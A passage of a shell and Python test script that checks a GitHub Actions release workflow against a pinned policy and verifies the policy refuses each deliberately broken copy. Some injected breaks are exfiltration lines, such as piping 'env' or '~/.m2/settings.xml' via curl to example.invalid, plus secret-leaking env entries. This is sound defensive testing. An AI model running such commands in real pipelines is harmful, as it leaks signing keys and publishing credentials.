    echo "secret $name is not set in the maven-central environment" >&2
    missing=1
  fi
done
exit $missing""".split())
UPLOAD_RUN = ("./mvnw --batch-mode --no-transfer-progress -Prelease -Drevision=\"$VERSION\" "
              "-Dcentral.autoPublish=true -Dcentral.waitUntil=published -DskipTests -pl odds-feed -am deploy")
for step in steps("publish"):
    run = str(step.get("run", ""))
    if step.get("id") == "secrets":
        check(" ".join(run.split()) == SECRETS_RUN, "publish: the secrets step must run the secrets check and nothing else")
    if step.get("id") == "upload":
        separators = [t for t in (";", "&&", "||", "|", "`", "$(", "\n") if t in run.strip()]
        check(not separators, "publish: the upload must be one ./mvnw command, without %s" % " ".join(separators))
        check(" ".join(run.split()) == UPLOAD_RUN, "publish: the upload step must run exactly: %s" % UPLOAD_RUN)
        check((step.get("env") or {}).get("VERSION") == VERSION, "publish: the upload's VERSION must be %s" % VERSION)

# Last, the whole of release.yml against its pinned form: any change to it, in any job, has to
# update scripts/release-workflow.json as well, in the same reviewed change. Comments do not count.
actual_text = json.dumps(w, indent=2, sort_keys=True) + "\n"
pinned_text = open(pinned_path).read()
if actual_text != pinned_text:
    diff = "".join(difflib.unified_diff(pinned_text.splitlines(True), actual_text.splitlines(True),
                                         "scripts/release-workflow.json", "release.yml"))
    problems.append("release.yml differs from its pinned form in scripts/release-workflow.json; if the "
                    "change is meant, update it with scripts/release-workflow-test.sh --update:\n" + diff)

for problem in problems:
    print("FAIL " + problem, file=sys.stderr)
sys.exit(1 if problems else 0)
EOF

pinned=$root/scripts/release-workflow.json
pinned_next=$root/scripts/next-workflow.json
policy() {
  python3 "$work/policy.py" "$1" "$pinned" "$pinned_next"
}

# --update writes release.yml's current form as the pinned one, for a deliberate change to it.
# Only loading and dumping, so that the file is written only when that worked; the policy below
# then still has to pass.
if [ "${1:-}" = "--update" ]; then
  if yq -o=json '.' "$root/.github/workflows/release.yml" \
    | python3 -c 'import json, sys; print(json.dumps(json.load(sys.stdin), indent=2, sort_keys=True))' \
      > "$pinned.part"; then
    mv "$pinned.part" "$pinned"
    echo "wrote $pinned; review the diff"
  else
    rm -f "$pinned.part"
    echo "could not read release.yml; $pinned is unchanged" >&2
    exit 1
  fi
  if yq -o=json '.' "$root/.github/workflows/next.yml" \
    | python3 -c 'import json, sys; print(json.dumps(json.load(sys.stdin), indent=2, sort_keys=True))' \
      > "$pinned_next.part"; then
    mv "$pinned_next.part" "$pinned_next"
    echo "wrote $pinned_next; review the diff"
  else
    rm -f "$pinned_next.part"
    echo "could not read next.yml; $pinned_next is unchanged" >&2
    exit 1
  fi
fi

if ! policy "$root"; then
  echo "release.yml breaks the release policy" >&2
  exit 1
fi
echo "release.yml keeps its release policy"

# Each rule broken once, in a copy: the policy must refuse each copy, for that rule. A break
# names text that occurs exactly once in its file, so it lands where it is meant to.
failures=0
# breaks <workflow file> replace <text> <new text> <what the refusal says>
# breaks <workflow file> move <text> <anchor> <what the refusal says>  (puts text after anchor)
breaks() {
  local file=$1 how=$2 old=$3 new=$4 reason=$5 copy=$work/copy
  rm -rf "$copy"
  mkdir -p "$copy/.github"
  cp -R "$root/.github/workflows" "$copy/.github/"
  if ! python3 - "$copy/.github/workflows/$file" "$how" "$old" "$new" <<'EOF'
import sys
path, how, old, new = sys.argv[1:]
text = open(path).read()
for needle in (old,) if how == "replace" else (old, new):
    if text.count(needle) != 1:
        sys.exit("%d times, not once, in %s: %s" % (text.count(needle), path, needle))
if how == "replace":
    text = text.replace(old, new)
else:
    text = text.replace(old, "")
    text = text.replace(new, new + "\n" + old.rstrip("\n") + "\n")
open(path, "w").write(text)
EOF
  then
    echo "FAIL could not break the copy for \"$reason\"" >&2
    failures=$((failures + 1))
    return
  fi
  if policy "$copy" 2> "$work/err"; then
    echo "FAIL the policy accepted a copy that should fail with \"$reason\"" >&2
    failures=$((failures + 1))
  elif ! grep -qF -- "$reason" "$work/err"; then
    echo "FAIL the policy refused a copy, but not with \"$reason\": $(cat "$work/err")" >&2
    failures=$((failures + 1))
  else
    echo "ok   refused: $reason"
  fi
}

top='permissions:
  contents: read

jobs:
'
check_job='    name: Check the tag
'
check_step='        run: ./scripts/release-check.sh "$GITHUB_REF_NAME"'
publish_job='    name: Sign and publish to Maven Central
'
publish_tag='      - name: Check the tag still names this commit
        # a release can wait days for its approval, and the tag be moved or deleted meanwhile
        run: ./scripts/release-tag-check.sh "$GITHUB_REF_NAME" "$COMMIT"
'
publish_tag_step="$publish_tag"'        env:
          COMMIT: ${{ needs.check.outputs.commit }}

'
release_job='    name: GitHub Release
'
release_tag='      - name: Check the tag still names the published commit
        run: ./scripts/release-tag-check.sh "$GITHUB_REF_NAME" "$COMMIT"
'
release_tag_step="$release_tag"'        env:
          COMMIT: ${{ needs.check.outputs.commit }}

'
publish_ref='          # the commit check accepted and build tested, whatever the tag names by now
          ref: ${{ needs.check.outputs.commit }}
'
release_ref='          # the commit Central got
          ref: ${{ needs.check.outputs.commit }}
'
release_checkout='      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
'"$release_ref"'          persist-credentials: false

'

# the workflow itself
breaks release.yml replace 'on:
  push:
' 'on:
  workflow_dispatch:
  push:
' "release.yml must run on v1.* tags only"
breaks release.yml replace "$top" 'permissions:
  contents: write

jobs:
' "the workflow default must be contents: read"
breaks release.yml replace "$top" "${top%jobs:
}env:
  LEAK: \${{ secrets.MAVEN_GPG_KEY }}

jobs:
" "release.yml must not read secrets outside its jobs"

# check
breaks release.yml replace "$check_step" '        run: echo "version=1.0.0" >> "$GITHUB_OUTPUT"' \
  'check must run ./scripts/release-check.sh "$GITHUB_REF_NAME" as a step of its own'
breaks release.yml replace "$check_step" "        if: false
$check_step" "check: the release check must not be conditional"
breaks release.yml replace "$check_step" "        continue-on-error: true
$check_step" "check: the release check must not continue on error"
breaks release.yml replace '      version: ${{ steps.tag.outputs.version }}' '      version: 1.0.0' \
  "check's version must be the release check's own output"
breaks release.yml replace '      final: ${{ steps.tag.outputs.final }}' "      final: 'false'" \
  "check's final must be the release check's own output"
breaks release.yml replace "$check_job" "${check_job}    if: false
" "check must not be conditional"
breaks release.yml replace "$check_job" "${check_job}    continue-on-error: true
" "check must not continue on error"
breaks release.yml replace '      contents: read
      pull-requests: read
' '      contents: read
      pull-requests: write
' "check's permissions must be"

# the approval check
approval_step='        run: ./scripts/release-approval-check.sh "$COMMIT"'
approval_env='          COMMIT: ${{ steps.tag.outputs.commit }}
          GH_TOKEN: ${{ github.token }}
'
breaks release.yml replace "$approval_step" '        run: echo "approved"' \
  'check must run ./scripts/release-approval-check.sh "$COMMIT" as a step of its own'
breaks release.yml replace "$approval_step" "        if: false
$approval_step" "check: the approval check must not be conditional"
breaks release.yml replace "$approval_step" "        continue-on-error: true
$approval_step" "check: the approval check must not continue on error"
breaks release.yml replace "$approval_env" '          COMMIT: ${{ github.sha }}
          GH_TOKEN: ${{ github.token }}
' "the approval check must take COMMIT from the release check's own output"
breaks release.yml replace "$approval_env" '          COMMIT: ${{ steps.tag.outputs.commit }}
          GH_TOKEN: ${{ secrets.OTHER_TOKEN }}
' "the approval check must ask GitHub with the job token"
approval_whole='      - name: Check the pull requests were approved
        # Every pull request merged into main since the previous release was approved on GitHub for
        # its final commit, by someone other than its author: the ruleset of main neither dismisses
        # an approval that a later push made stale nor asks for one of the latest push, so a pull
        # request can merge on an approval of an earlier version of itself. Read-only, like the
        # step before; the first release starts from scripts/release-approval-baseline.
        # release-approval-check-test.sh, run by next.yml on every push, holds it to its cases.
        run: ./scripts/release-approval-check.sh "$COMMIT"
        env:
          COMMIT: ${{ steps.tag.outputs.commit }}
          GH_TOKEN: ${{ github.token }}

'
breaks release.yml move "$approval_whole" '          fetch-depth: 0
          persist-credentials: false
' "check must run the approval check after the release check"

# the signing key check
key_step='        run: ./scripts/release-key-check.sh'
breaks release.yml replace "$key_step" '        run: echo "the key is fine"' \
  'check must run ./scripts/release-key-check.sh as a step of its own'
breaks release.yml replace "$key_step" "        if: false
$key_step" "check: the signing key check must not be conditional"
breaks release.yml replace "$key_step" "        continue-on-error: true
$key_step" "check: the signing key check must not continue on error"
breaks release.yml replace '          RELEASE_KEY_FINGERPRINT: ${{ vars.RELEASE_KEY_FINGERPRINT }}

  build:' \
  '          RELEASE_KEY_FINGERPRINT: 0000000000000000000000000000000000000000

  build:' \
  "the signing key check must read RELEASE_KEY_FINGERPRINT from the repository variable"

# build
breaks release.yml replace '      commit: ${{ needs.check.outputs.commit }}
' '      commit: ${{ needs.check.outputs.commit }}
    secrets: inherit
' "build must not pass secrets on"
breaks release.yml replace '    uses: ./.github/workflows/next.yml
    with:
      revision: ${{ needs.check.outputs.version }}
      commit: ${{ needs.check.outputs.commit }}
' "    runs-on: ubuntu-latest
    steps:
      - run: 'true'
" "build must call ./.github/workflows/next.yml"
breaks release.yml replace '      revision: ${{ needs.check.outputs.version }}' '      revision: ${{ github.ref_name }}' \
  "build must pass revision: \${{ needs.check.outputs.version }}"
breaks release.yml replace '      commit: ${{ needs.check.outputs.commit }}
' '' "build must pass revision: \${{ needs.check.outputs.version }} and commit: \${{ needs.check.outputs.commit }}"
breaks release.yml replace '      commit: ${{ needs.check.outputs.commit }}
' '      commit: ${{ github.ref }}
' "build must pass revision: \${{ needs.check.outputs.version }} and commit: \${{ needs.check.outputs.commit }}"
build_permissions='    permissions:
      contents: read
    # the branch CI'
breaks release.yml replace "$build_permissions" "${build_permissions/read/write}" "build's permissions must be"
breaks release.yml replace "$build_permissions" "${build_permissions/read/read
      packages: read}" "build's permissions must be"

# the pinned form catches what no rule names
breaks release.yml replace '    timeout-minutes: 90
' '    timeout-minutes: 300
' "release.yml differs from its pinned form"

# publish
breaks release.yml replace '    environment: maven-central
' '    environment: production
' "publish must use maven-central"
breaks release.yml replace "$publish_job" "${publish_job}    if: \${{ always() }}
" "publish with check=failure"
breaks release.yml replace "$publish_job" "${publish_job}    continue-on-error: true
" "publish must not continue on error"
breaks release.yml replace "$publish_job" "${publish_job}    permissions:
      contents: read
      id-token: write
" "publish's permissions must be"
breaks release.yml replace '          VERSION: ${{ needs.check.outputs.version }}
          CENTRAL_TOKEN_USERNAME' '          VERSION: ${{ github.ref_name }}
          CENTRAL_TOKEN_USERNAME' "publish: 'Sign and publish' takes VERSION from"
breaks release.yml replace '          ./mvnw --batch-mode --no-transfer-progress -Prelease -Drevision="$VERSION"
' '          env | curl -d @- https://example.invalid; ./mvnw --batch-mode --no-transfer-progress -Prelease -Drevision="$VERSION"
' "publish: the upload must be one ./mvnw command"
breaks release.yml replace '          exit $missing
' '          exit 0
' "publish: the secrets step must run the secrets check and nothing else"
breaks release.yml replace '    environment: maven-central
' '    environment: maven-central
    env:
      KEY: ${{ secrets.MAVEN_GPG_KEY }}
' "publish must read secrets on its steps only"
for read in 'secrets.MAVEN_GPG_KEY' "Secrets['MAVEN_GPG_KEY']"; do
  breaks release.yml replace "$publish_tag_step" "${publish_tag_step%
}          KEY: \${{ $read }}

" "publish: only the steps with id secrets, signing-key and upload may read secrets"
done
signing_key_step='      - name: Check the signing key is the one that was checked
        id: signing-key
        # The check job looked at the public key of RELEASE_KEY_FINGERPRINT; what signs is this
        # secret, which nothing else ties to it. It must be the export of that key'"'"'s subkeys, its
        # primary a stub, with a signing subkey that is neither revoked nor expired. It then asks
        # both keyservers again, now that the approval is given, for the subkey this secret signs
        # with: they must have it, not revoked, not about to expire. Before the build, so that a
        # wrong or stale secret fails here and signs nothing. release-signing-key-check-test.sh,
        # run by next.yml on every push, holds it to its cases.
        run: ./scripts/release-signing-key-check.sh
        env:
          MAVEN_GPG_KEY: ${{ secrets.MAVEN_GPG_KEY }}
          RELEASE_KEY_FINGERPRINT: ${{ vars.RELEASE_KEY_FINGERPRINT }}

'
signing_key_run='        run: ./scripts/release-signing-key-check.sh'
breaks release.yml replace "$signing_key_run" '        run: echo "the key is fine"' \
  "publish: the signing key step must run ./scripts/release-signing-key-check.sh and nothing else"
breaks release.yml replace "$signing_key_run" "        if: false
$signing_key_run" "publish: the signing key check must not be conditional"
breaks release.yml replace "$signing_key_run" "        continue-on-error: true
$signing_key_run" "publish: the signing key check must not continue on error"
breaks release.yml replace '          RELEASE_KEY_FINGERPRINT: ${{ vars.RELEASE_KEY_FINGERPRINT }}

      - name: Set up JDK 25' '          RELEASE_KEY_FINGERPRINT: 0000000000000000000000000000000000000000

      - name: Set up JDK 25' "publish: the signing key check must read MAVEN_GPG_KEY from the secret"
breaks release.yml replace '        id: signing-key
' '        id: key-check
' "publish must have one step with id signing-key, found 0"
breaks release.yml move "$signing_key_step" '          if-no-files-found: warn
' "publish must check the signing key before it deploys"
breaks release.yml replace "$publish_tag" "${publish_tag%%        # *}        if: false
${publish_tag#*
}" "publish: the tag check must not be conditional"
breaks release.yml replace "$publish_tag" "${publish_tag%%        # *}        continue-on-error: true
${publish_tag#*
}" "publish: the tag check must not continue on error"
breaks release.yml replace "$publish_tag" "${publish_tag%
} || true
" "publish: the tag check must run"
breaks release.yml move "$publish_tag_step" '          if-no-files-found: warn
' "publish must check the tag again before it deploys"
breaks release.yml replace "$publish_ref" '' "publish must check out \${{ needs.check.outputs.commit }}, not None"
breaks release.yml replace "$publish_ref" '          ref: ${{ github.ref }}
' "publish must check out \${{ needs.check.outputs.commit }}, not '\${{ github.ref }}'"
breaks release.yml replace "$publish_ref" '          ref: main
' "publish must check out \${{ needs.check.outputs.commit }}, not 'main'"
breaks release.yml replace '        id: upload
' '        id: deploy
' "publish must have one step with id upload, found 0"
breaks release.yml replace '      - name: Keep the published bundle
' '      - name: Stray
        run: echo deploy
        env:
          KEY: ${{ secrets.MAVEN_GPG_KEY }}

      - name: Keep the published bundle
' "publish: only the steps with id secrets, signing-key and upload may read secrets, not 'Stray'"
breaks release.yml replace '          -DskipTests -pl odds-feed -am deploy
' '          -DskipTests -pl odds-feed -am deploy
          && curl -d @"$HOME/.m2/settings.xml" https://example.invalid
' "publish: the upload step must run ./mvnw -Prelease ... deploy"
breaks release.yml replace '      - name: Sign and publish
' '      - name: Restore
        uses: actions/cache/restore@v4
        with:
          path: ~/.m2
          key: maven

      - name: Sign and publish
' "publish must not restore a cache: actions/cache/restore@v4"
breaks release.yml replace "          distribution: 'corretto'
          # No cache" "          distribution: 'corretto'
          cache: 'maven'
          # No cache" "publish must not restore a cache: actions/setup-java"

# the bundle kept after a failed publish
keep_step='      - name: Keep the published bundle
        # Also after a publish that failed, and a run that was cancelled: the plugin writes the
        # bundle before it uploads, so one whose wait for Central timed out, or was cancelled, still
        # has it, and the release is made from it by hand (RELEASING.md). Nothing is released from a
        # failed run: github-release needs publish to succeed. A step that failed before the build
        # leaves no bundle, hence the warning.
        if: ${{ always() }}
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          # one name per attempt, never overwritten: a re-run after a wait that timed out builds
          # another bundle, which Central refuses, and must not replace the first attempt'"'"'s, the
          # copy of what Central has
          name: central-bundle-${{ github.run_attempt }}
          path: target/central-publishing/central-bundle.zip
          if-no-files-found: warn

'
keep_if='        if: ${{ always() }}
'
keep_name='          name: central-bundle-${{ github.run_attempt }}
'
breaks release.yml replace "$keep_if" '' "publish must keep the bundle also after a failed upload"
breaks release.yml replace "$keep_if" "        if: \${{ success() }}
" "publish must keep the bundle also after a failed upload"
breaks release.yml replace "$keep_if" "        if: \${{ failure() }}
" "publish must keep the bundle also after a failed upload: runs=False with the upload succeeded"
breaks release.yml replace "$keep_if" "        if: \${{ !cancelled() }}
" "publish must keep the bundle also when the run is cancelled: runs=False with the upload succeeded"
breaks release.yml replace "$keep_if" "        if: \${{ !failure() }}
" "publish must keep the bundle also after a failed upload: runs=False with the upload failed"
breaks release.yml replace "$keep_if" "$keep_if        continue-on-error: true
" "publish: keeping the bundle must not continue on error"
breaks release.yml replace "$keep_name" '          name: central-bundle
' "publish must keep the bundle as central-bundle-\${{ github.run_attempt }}, one per attempt"
breaks release.yml replace "$keep_name" '          name: bundle
' "publish must keep the central-bundle artifact once, found 0"
breaks release.yml replace '          if-no-files-found: warn
' '          if-no-files-found: warn
          overwrite: true
' "publish must not overwrite a bundle an earlier attempt kept"
breaks release.yml replace '          if-no-files-found: warn
' '          if-no-files-found: warn
          overwrite: false
' "publish must not overwrite a bundle an earlier attempt kept"
breaks release.yml replace '      bundle: central-bundle-${{ github.run_attempt }}
' '      bundle: central-bundle
' "publish must output the bundle's name"
breaks release.yml replace '      bundle: central-bundle-${{ github.run_attempt }}
' '' "publish must output the bundle's name"
breaks release.yml replace '          name: ${{ needs.publish.outputs.bundle }}
' '          name: central-bundle
' "github-release must download the artifact named by \${{ needs.publish.outputs.bundle }}"
breaks release.yml replace '          name: ${{ needs.publish.outputs.bundle }}
' '          name: bundle
' "github-release must download the artifact named by \${{ needs.publish.outputs.bundle }}"
breaks release.yml move "$keep_step" "$publish_tag_step" "publish must keep the bundle after the upload"

# github-release
breaks release.yml replace "if: \${{ !cancelled() && needs.publish.result == 'success' }}" "if: \${{ !cancelled() }}" \
  "github-release with publish=failure"
breaks release.yml replace '    needs: [check, publish]
' '    needs: [check]
' "github-release must need publish"
breaks release.yml replace "if: \${{ !cancelled() && needs.publish.result == 'success' }}" \
  "if: \${{ !cancelled() && needs.publish.result == 'success' && needs.check.outputs.final == 'false' }}" \
  "github-release with publish=success final=true"
breaks release.yml replace "$release_job" "${release_job}    continue-on-error: true
" "github-release must not continue on error"
breaks release.yml replace '          VERSION: ${{ needs.check.outputs.version }}
          FINAL:' '          VERSION: ${{ github.ref_name }}
          FINAL:' "github-release: 'Create the release' takes VERSION from"
breaks release.yml replace "$release_job" "${release_job}    environment: maven-central
" "github-release must not use an environment"
breaks release.yml replace '        run: ./scripts/release-github.sh
' '        run: gh release create "$GITHUB_REF_NAME" --notes-file "release-notes/$VERSION.md"
' "github-release must create the release with ./scripts/release-github.sh, once"
breaks release.yml replace '          GH_REPO: ${{ github.repository }}' '          GH_REPO: ${{ github.repository }}
          LEAK: ${{ secrets.MAVEN_GPG_KEY }}' "github-release must not read secrets"
breaks release.yml replace "$release_tag" "${release_tag%%        run:*}        if: false
        run: ${release_tag#*run: }" "github-release: the tag check must not be conditional"
breaks release.yml replace "$release_tag" "${release_tag%
} || true
" "github-release: the tag check must run"
breaks release.yml move "$release_tag_step" '          GH_REPO: ${{ github.repository }}
' "github-release must check the tag again before it creates the release"
breaks release.yml replace "$release_ref" '' "github-release must check out \${{ needs.check.outputs.commit }}, not None"
breaks release.yml replace "$release_ref" '          ref: ${{ github.ref }}
' "github-release must check out \${{ needs.check.outputs.commit }}, not '\${{ github.ref }}'"
breaks release.yml replace "$release_ref" '          ref: main
' "github-release must check out \${{ needs.check.outputs.commit }}, not 'main'"
breaks release.yml move "$release_checkout" "${release_tag_step%
}" "github-release must check out once, as its first step"

# rules no copy above reaches yet: one copy each
breaks release.yml replace "$publish_job" "${publish_job}    if: \${{ success() }}
" "publish: cannot evaluate if"
breaks release.yml replace '    uses: ./.github/workflows/next.yml
' '    uses: oddin-gg/javasdk/.github/workflows/next.yml@main
' "build calls a workflow this test cannot follow"
breaks release.yml replace '  github-release:
' '  extra:
    runs-on: ubuntu-latest
    steps:
      - run: echo nothing

  github-release:
' "release.yml must have the jobs"
breaks release.yml replace '      commit: ${{ steps.tag.outputs.commit }}' '      commit: ${{ github.sha }}' \
  "check's commit must be the release check's own output"
breaks release.yml replace '        id: secrets
' '        id: check-secrets
' "publish must have one step with id secrets, found 0"
breaks release.yml move '      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          # the commit check accepted and build tested, whatever the tag names by now
          ref: ${{ needs.check.outputs.commit }}
          persist-credentials: false

' '          exit $missing
        env:
          CENTRAL_TOKEN_USERNAME: ${{ secrets.CENTRAL_TOKEN_USERNAME }}
          CENTRAL_TOKEN_PASSWORD: ${{ secrets.CENTRAL_TOKEN_PASSWORD }}
          MAVEN_GPG_KEY: ${{ secrets.MAVEN_GPG_KEY }}
          MAVEN_GPG_PASSPHRASE: ${{ secrets.MAVEN_GPG_PASSPHRASE }}
' "publish must check out once, as its first step"
breaks release.yml replace '      - name: Sign and publish
' "${publish_tag_step}      - name: Sign and publish
" "publish must check the tag once, found 2"
breaks release.yml replace '          VERSION: ${{ needs.check.outputs.version }}
          CENTRAL_TOKEN_USERNAME' '          VERSION: ${{ github.ref_name }}
          CENTRAL_TOKEN_USERNAME' "publish: the upload's VERSION must be"
breaks release.yml replace '    permissions:
      contents: write
' '    permissions:
      contents: read
' "github-release's permissions must be"
breaks release.yml replace '          FINAL: ${{ needs.check.outputs.final }}
' "          FINAL: 'true'
" "github-release: FINAL must be the check job's output"
breaks release.yml replace '          GH_REPO: ${{ github.repository }}
' '          GH_REPO: ${{ github.repository }}
          TAG: ${{ github.ref_name }}
' "github-release must take the version, tag and commit from the check job"
breaks release.yml replace '      - name: Create the release
' '      - name: Create the release
        if: false
' "github-release: creating the release must not be conditional"
breaks release.yml replace '      - name: Create the release
' '      - name: Create the release
        continue-on-error: true
' "github-release: creating the release must not continue on error"

breaks release.yml replace "$publish_tag_step" "${publish_tag_step/needs.check.outputs.commit/github.sha}" \
  "publish: the tag check's COMMIT must be"
breaks release.yml replace "$release_tag_step" "${release_tag_step/needs.check.outputs.commit/github.sha}" \
  "github-release: the tag check's COMMIT must be"

# next.yml, which release.yml calls
next_top='permissions:
  contents: read

jobs:
'
breaks next.yml replace "$next_top" "${next_top%jobs:
}env:
  LEAK: \${{ secrets.MAVEN_GPG_KEY }}

jobs:
" "./.github/workflows/next.yml must not read secrets outside its jobs"
breaks next.yml replace '    name: Build & Test
' '    name: Build & Test
    environment: maven-central
' "./.github/workflows/next.yml > build must not use an environment"
breaks next.yml replace '    name: Build & Test
' '    name: Build & Test
    permissions:
      contents: write
' "./.github/workflows/next.yml > build's permissions must be read-only"
breaks next.yml replace '        run: ./mvnw --batch-mode --no-transfer-progress ${REVISION:+-Drevision=$REVISION} verify
' '        run: ./mvnw --batch-mode --no-transfer-progress verify
' ".github/workflows/next.yml must build once with"
breaks next.yml replace '          REVISION: ${{ inputs.revision }}
' '          REVISION: ${{ github.ref_name }}
' ".github/workflows/next.yml: the build's REVISION must be"
breaks next.yml replace '    name: Build & Test
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          # a release builds the commit its check accepted; otherwise the event'"'"'s own commit
          ref: ${{ inputs.commit }}
' '    name: Build & Test
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
' ".github/workflows/next.yml > build must check out \${{ inputs.commit }}, not None"
breaks next.yml replace "$next_top" "${next_top/read/read
  packages: write}" "./.github/workflows/next.yml's permissions must be read-only"

# next.yml without a package token: none at the top, on a job, or handed to a step, and no
# registry server for Maven to authenticate to
breaks next.yml replace "$next_top" "${next_top/read/read
  packages: read}" "./.github/workflows/next.yml must grant contents: read and nothing else"
breaks next.yml replace "$next_top" "${next_top#*read
}" "./.github/workflows/next.yml must grant contents: read and nothing else, not None"
breaks next.yml replace '    name: Build & Test
' '    name: Build & Test
    permissions:
      contents: read
      packages: read
' "./.github/workflows/next.yml > build must hold contents: read and nothing else"
breaks next.yml replace '    name: Wrapper checksum (Windows)
' '    name: Wrapper checksum (Windows)
    permissions: read-all
' "./.github/workflows/next.yml > wrapper-windows must hold contents: read and nothing else"
breaks next.yml replace "          cache: 'maven'
" "          cache: 'maven'
          server-id: oddin-github
          server-username: GITHUB_ACTOR
          server-password: GITHUB_TOKEN
" "./.github/workflows/next.yml > build must name no registry server: server-id, server-password, server-username"
for token in 'secrets.GITHUB_TOKEN' "Secrets['GITHUB_TOKEN']" 'SECRETS.github_token' 'github.token' "github['token']" 'github["TOKEN"]' 'GitHub.Token' \
    "github[format('{0}', 'token')]" 'toJSON(github)' 'github'; do
  breaks next.yml replace '        run: ./scripts/fetch-sdk.sh
' "        run: ./scripts/fetch-sdk.sh
        env:
          GITHUB_TOKEN: \${{ $token }}
" "./.github/workflows/next.yml must not hand its steps the job token: $token"
done
# workflow-level env reaches every job's steps
breaks next.yml replace "$next_top" "${next_top%jobs:
}env:
  GITHUB_TOKEN: \${{ github.token }}

jobs:
" "./.github/workflows/next.yml must not hand its steps the job token: github.token"
for read in 'secrets.MAVEN_GPG_KEY' "secrets['MAVEN_GPG_KEY']" "Secrets['MAVEN_GPG_KEY']" 'SECRETS.MAVEN_GPG_KEY' "secrets[format('MAVEN_{0}', 'GPG_KEY')]" 'toJSON(secrets)'; do
  breaks next.yml replace '          REVISION: ${{ inputs.revision }}
' "          REVISION: \${{ inputs.revision }}
          LEAK: \${{ $read }}
" "./.github/workflows/next.yml > build must not read secrets: $read"
done

# next.yml's 1.0 job: there, on every run, testing 1.0, and checking it did
breaks next.yml replace '  system-tests-next:
' '  system-tests-legacy:
' "./.github/workflows/next.yml must have the job system-tests-next"
breaks next.yml replace '    name: System tests against 1.0
' '    name: System tests against 1.0
    if: false
' "./.github/workflows/next.yml > system-tests-next must not be conditional"
breaks next.yml replace '    name: System tests against 1.0
' '    name: System tests against 1.0
    continue-on-error: true
' "./.github/workflows/next.yml > system-tests-next must not continue on error"
breaks next.yml replace ' -Dsdk.next -pl system-tests -am verify
' ' -pl system-tests -am verify
' "./.github/workflows/next.yml > system-tests-next must test 1.0 once with"
breaks next.yml replace '          REVISION: "${{ inputs.revision }}"
' '          REVISION: "${{ github.ref_name }}"
' "./.github/workflows/next.yml > system-tests-next: REVISION must be"
breaks next.yml replace '          case = cases.get("theSdkIsTheOneThisReactorBuilt")
' '          case = cases.get("anyTest")
' "./.github/workflows/next.yml > system-tests-next must check that the 1.0 version test ran"

for step in '      - name: Build the SDK and run the system tests against it
' '      - name: Check the integration tests ran, against 1.0
'; do
  what="the 1.0 run"; case $step in *Check*) what="the version test check" ;; esac
  breaks next.yml replace "$step" "$step        if: false
" "system-tests-next: $what must not be conditional"
  breaks next.yml replace "$step" "$step        continue-on-error: true
" "system-tests-next: $what must not continue on error"
done
breaks next.yml replace '    permissions:
      contents: read
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          # a release builds the commit its check accepted; otherwise the event'"'"'s own commit
          ref: ${{ inputs.commit }}
          # do not leave the job token in .git/config for the build to find
          persist-credentials: false

      - name: Check the checkout left no credentials behind' '    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          # a release builds the commit its check accepted; otherwise the event'"'"'s own commit
          ref: ${{ inputs.commit }}
          # do not leave the job token in .git/config for the build to find
          persist-credentials: false

      - name: Check the checkout left no credentials behind' \
  "./.github/workflows/next.yml > system-tests-next must hold contents: read and nothing else"
breaks next.yml replace "          distribution: 'corretto'
          # No server" "          distribution: 'corretto'
          cache: 'maven'
          # No server" "./.github/workflows/next.yml > system-tests-next must restore no cache and name no registry server: cache"
breaks next.yml replace "          distribution: 'corretto'
          # No server" "          distribution: 'corretto'
          server-id: oddin-github
          # No server" "./.github/workflows/next.yml > system-tests-next must restore no cache and name no registry server: server-id"
breaks next.yml replace "          outcome = [child.tag for child in case if child.tag in (\"skipped\", \"failure\", \"error\")]
" "          outcome = [child.tag for child in case if child.tag in (\"failure\", \"error\")]
" "next.yml differs from its pinned form"

breaks next.yml replace '      - name: Build the SDK and run the system tests against it
' '      - uses: actions/cache/restore@v4
        with:
          path: ~/.m2/repository
          key: m2
      - name: Build the SDK and run the system tests against it
' "./.github/workflows/next.yml > system-tests-next must restore no cache: actions/cache/restore@v4"

breaks next.yml replace '      - name: Check the checkout left no credentials behind
        # persist-credentials: false is only a setting until something notices it stopped' '      - name: Check the checkout left no credentials behind
        if: false
        # persist-credentials: false is only a setting until something notices it stopped' \
  "build: the credential guard must not be conditional"
breaks next.yml replace '      - name: Check the checkout left no credentials behind
        # persist-credentials: false is only a setting until something notices it stopped' '      - name: Check the checkout left no credentials behind
        continue-on-error: true
        # persist-credentials: false is only a setting until something notices it stopped' \
  "build: the credential guard must not continue on error"
breaks next.yml replace '    name: Build & Test
    runs-on: ubuntu-latest
    steps:
      - name: Checkout' '    name: Build & Test
    runs-on: ubuntu-latest
    steps:
      - name: Check the checkout left no credentials behind
        run: "true"
      - name: Checkout' \
  "./.github/workflows/next.yml > build must check once that its checkout left no credentials behind"
breaks next.yml replace '      - name: Check the checkout left no credentials behind
        # persist-credentials: false is only a setting until something notices it stopped' '      - name: Look around first
        run: "true"
      - name: Check the checkout left no credentials behind
        # persist-credentials: false is only a setting until something notices it stopped' \
  "./.github/workflows/next.yml > build must check its checkout for credentials in the step right after it"
breaks next.yml replace '      - name: Check the checkout left no credentials behind
        shell: pwsh' '      - name: Check the checkout
        shell: pwsh' \
  "./.github/workflows/next.yml > wrapper-windows must check once that its checkout left no credentials behind"

# next.yml's stress job: there, on every run, running its scenarios, and checking that it did
breaks next.yml replace '  stress:
' '  stress-legacy:
' "./.github/workflows/next.yml must have the job stress"
breaks next.yml replace '    name: Stress
' '    name: Stress
    if: false
' "./.github/workflows/next.yml > stress must not be conditional"
breaks next.yml replace '    name: Stress
' '    name: Stress
    continue-on-error: true
' "./.github/workflows/next.yml > stress must not continue on error"
breaks next.yml replace '    timeout-minutes: 10
' '    timeout-minutes: 60
' "./.github/workflows/next.yml > stress must stop after 10 minutes"
breaks next.yml replace ' -Dgroups=stress -Dstress.excluded=none' ' -Dstress.excluded=none' \
  "./.github/workflows/next.yml > stress must run the stress scenarios once"
breaks next.yml replace '      - name: Run the stress scenarios
' '      - name: Run the stress scenarios
        if: false
